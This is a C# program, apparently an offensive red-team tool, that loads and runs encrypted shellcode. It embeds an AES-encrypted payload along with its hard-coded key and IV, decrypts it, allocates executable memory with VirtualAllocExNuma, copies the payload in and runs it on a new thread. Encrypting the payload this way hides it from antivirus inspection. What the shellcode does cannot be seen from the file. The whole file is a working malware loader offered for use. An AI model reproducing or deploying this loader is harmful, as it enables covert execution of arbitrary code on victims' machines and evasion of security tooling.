using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.InteropServices;
// encryption/decryption shamelessly stolen from: https://github.com/shaddy43/AES_Shellcode_Encryptor

namespace AES_SCRunner
{
    class Program
    {
        private static string aes_key = "bbzCJMnU6h1W9xHrLpvXcyn3jydQQn1o";
        private static string aes_iv = "UH33SE8jmJgkjxvA";
        static void Main(string[] args)
        {
            // Generating sha256 hashed encryption key 
            string hashed = ComputeSha256Hash(aes_key);
            string fixed_hash = hashed.Substring(0, 32);
            aes_key = fixed_hash;
            IntPtr gcp = GetCurrentProcess();
            //Console.WriteLine(aes_key);

            // AES256 Encrypted shellcode
            string shellcode = "nsyf4Ix0wZch8s8ELhEyBMObwCezU5ocWzOE1TLPGa+85MDZd/vEVILAhlcGf5LHt0DdQFKlSuuEa92+mE/fuSSDwmRzbjbcpzktQRUvsAWxX5wAKcAKBQJSJplFFi9zmy9wumwgyn+eFk+ou3M/Lsmgy8Sgz99e/eB6t0Tjevkvj7YpvttGLNneGiAqYTm+P+xNk+Ga/Hv/Wa/E29glSncTwAo7vOODk14GhWNiRMx+ZKdys69EXbv5GAV+SX9v1S2RAKCWEboAlZDAk+bbZg7KNn+eABYcZtIJP5R5fEaUpN9roRJUnTCgAcTYefYAjtB9XnKJ+yQetidwFGVEsEmCcX8xF167hIUma0fOpasxpevMJYEHUSlGqJmWqzzk0qm9j3gq6ISEW9rtuLJUGd75Gev90yNbOOXcJNuUY1OW9OG8psO8ioki6sZds3rSbrVzgyhPtQURASRXD+PsDNvXzs14nIquBtNO5lmUCVgPPiokJwZVHAQCKk0ewDgai5lzoPgAPh2ndSX7XAG00Q==";
            byte[] scBytes = Convert.FromBase64String(shellcode);

            //Decrypting shellcode and converting to byte[] from base64
            string byte_string_decrypted = DecryptAES(scBytes);
            byte[] byte_decrypted = Convert.FromBase64String(byte_string_decrypted);

            //Console.WriteLine("Size: " + byte_decrypted.Length);

            IntPtr vAlloc = VirtualAllocExNuma(gcp, IntPtr.Zero, (uint)byte_decrypted.Length, 0x1000 | 0x2000, 0x40, 0);
            //Console.WriteLine("Pointer to VirtualAlloc: " + vAlloc);
            
            Marshal.Copy(byte_decrypted, 0, vAlloc, byte_decrypted.Length);

            IntPtr cThread = CreateThread(IntPtr.Zero, 0, vAlloc, IntPtr.Zero, 0, IntPtr.Zero);
            //Console.WriteLine("Pointer to CreateThread: " + cThread);

            WaitForSingleObject(cThread, 0xFFFFFFFF);
            
        }

        private static string DecryptAES(byte[] encrypted)
        {
            string decrypted = null;
            byte[] cipher = encrypted;

            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.Key = Encoding.ASCII.GetBytes(aes_key);
                aes.IV = Encoding.ASCII.GetBytes(aes_iv);
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform dec = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream(cipher))
                {
                    using (CryptoStream cs = new CryptoStream(ms, dec, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            decrypted = sr.ReadToEnd();
                        }
                    }
                }
            }
            return decrypted;
        }
        static string ComputeSha256Hash(string rawData)
        {
            // Create a SHA256   
            using (SHA256 sha256Hash = SHA256.Create())
            {
                // ComputeHash - returns byte array  
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

                // Convert byte array to a string   
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    builder.Append(bytes[i].ToString("x2"));
                }
                return builder.ToString();
            }
        }

        // PInvoke GetCurrentProcess();
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
